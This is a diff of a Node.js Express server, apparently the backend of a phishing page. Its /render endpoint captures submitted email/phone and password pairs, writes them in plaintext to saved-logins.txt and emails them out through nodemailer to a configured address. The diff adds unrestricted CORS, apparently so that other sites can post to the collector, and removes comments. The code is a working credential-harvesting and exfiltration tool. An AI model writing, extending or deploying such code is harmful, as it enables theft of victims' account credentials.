@@ -2,11 +2,13 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const fs = require("fs");
 const nodemailer = require("nodemailer");
+const cors = require("cors"); // 🆕 CORS support
 require("dotenv").config();
 
 const app = express();
 const port = process.env.PORT || 3000;
 
+app.use(cors()); // ✅ Allow CORS
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
@@ -23,12 +25,10 @@ app.post("/render", (req, res) => {
   const { email, password } = req.body;
   const logEntry = `EMAIL/PHONE: ${email} | PASSWORD: ${password} | TIME: ${new Date().toISOString()}\n`;
 
-  // Save to file (optional)
   fs.appendFile("saved-logins.txt", logEntry, (err) => {
     if (err) console.error("Error saving file:", err);
   });
 
-  // Send to Gmail
   const mailOptions = {
     from: process.env.EMAIL_USER,
     to: process.env.SEND_TO,
